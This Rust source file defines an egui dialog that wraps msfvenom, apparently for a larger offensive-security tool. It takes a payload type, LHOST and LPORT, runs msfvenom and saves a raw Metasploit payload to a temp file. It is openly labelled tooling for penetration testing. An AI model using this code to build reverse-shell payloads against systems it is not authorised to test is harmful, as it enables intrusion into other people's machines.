use std::{path::PathBuf, process::Command, sync::{Arc, Mutex}, thread};

use eframe::egui;

use crate::types::{needs_conn, PAYLOAD_TYPES};

pub struct MsfDialog {
    pub payload_idx: usize,
    pub lhost:       String,
    pub lport:       String,
    status:          String,
    running:         bool,
    result:          Arc<Mutex<Option<Result<PathBuf, String>>>>,
}

impl Default for MsfDialog {
    fn default() -> Self {
        Self {
            payload_idx: 0,
            lhost:       "192.168.1.x".into(),
            lport:       "4444".into(),
            status:      "Ready.".into(),
            running:     false,
            result:      Arc::new(Mutex::new(None)),
        }
    }
}

impl MsfDialog {
    /// Render the dialog window. Sets `file_path` and clears `open` on success.
    pub fn show(
        &mut self,
        ctx:       &egui::Context,
        open:      &mut bool,
        file_path: &mut String,
    ) {
        // `.open()` borrows its flag for the entire `show()` call, so we
        // can't also write it inside the closure. Use a separate local for
        // the X-button, then merge both close signals afterwards.
        let mut x_closed     = false;
        let mut inner_closed = false;

        egui::Window::new("Generate Payload (msfvenom)")
            .open(&mut x_closed)
            .resizable(false)
            .collapsible(false)
            .show(ctx, |ui| {
                egui::Grid::new("msf_grid")
                    .num_columns(2)
                    .spacing([8.0, 6.0])
                    .show(ui, |ui| {
                        ui.label("Payload:");
                        egui::ComboBox::from_id_salt("msf_payload")
                            .selected_text(PAYLOAD_TYPES[self.payload_idx])
                            .width(300.0)
                            .show_ui(ui, |ui| {
                                for (i, p) in PAYLOAD_TYPES.iter().enumerate() {
                                    ui.selectable_value(&mut self.payload_idx, i, *p);
                                }
                            });
                        ui.end_row();

                        let conn = needs_conn(PAYLOAD_TYPES[self.payload_idx]);
                        ui.label("LHOST:");
                        ui.add_enabled(
                            conn,
                            egui::TextEdit::singleline(&mut self.lhost).desired_width(200.0),
                        );
                        ui.end_row();

                        ui.label("LPORT:");
                        ui.add_enabled(
                            conn,
                            egui::TextEdit::singleline(&mut self.lport).desired_width(80.0),
                        );
                        ui.end_row();
                    });

                ui.separator();

                // Poll result from background thread
                if let Some(r) = self.result.lock().unwrap().take() {
                    self.running = false;
                    match r {
                        Ok(p) => {
                            self.status = "[+] Done — payload ready.".into();
                            *file_path  = p.to_string_lossy().into_owned();
                            inner_closed = true;
                        }
                        Err(e) => {
                            self.status = format!("[!] msfvenom failed: {e}");
                        }
                    }
                }

                ui.label(&self.status.clone());
                ui.separator();

                ui.horizontal(|ui| {
                    if ui.add_enabled(!self.running, egui::Button::new("Generate"))
                        .clicked()
                    {
                        self.validate_and_start(ctx.clone());
                    }
                    if ui.button("Cancel").clicked() {
                        inner_closed = true;
                    }
                });
            });

        // X-button sets x_closed=false (egui toggles it); content close sets inner_closed
        if !x_closed || inner_closed {
            *open = false;
        }
    }

    fn validate_and_start(&mut self, ctx: egui::Context) {
        let conn = needs_conn(PAYLOAD_TYPES[self.payload_idx]);
        if conn && (self.lhost.is_empty() || self.lhost == "192.168.1.x") {
            self.status = "[!] Enter LHOST.".into();
            return;
        }
        if conn && !self.lport.chars().all(|c| c.is_ascii_digit()) {
            self.status = "[!] LPORT must be numeric.".into();
            return;
        }

        let payload  = PAYLOAD_TYPES[self.payload_idx];
        let out_path = std::env::temp_dir().join("hf_payload.bin");
        let result   = Arc::clone(&self.result);

        let mut cmd = Command::new("msfvenom");
        cmd.args(["-p", payload, "-f", "raw", "-o",
                  out_path.to_str().unwrap_or("/tmp/hf_payload.bin")]);
        if conn {
            cmd.arg(format!("LHOST={}", self.lhost));
            cmd.arg(format!("LPORT={}", self.lport));
        }

        self.running = true;
        self.status  = "Generating…".into();

        thread::spawn(move || {
            let r = match cmd.output() {
                Ok(o) if o.status.success() => Ok(out_path),
                Ok(o)  => Err(String::from_utf8_lossy(&o.stderr).into_owned()),
                Err(e) => Err(e.to_string()),
            };
            *result.lock().unwrap() = Some(r);
            ctx.request_repaint();
        });
    }
}
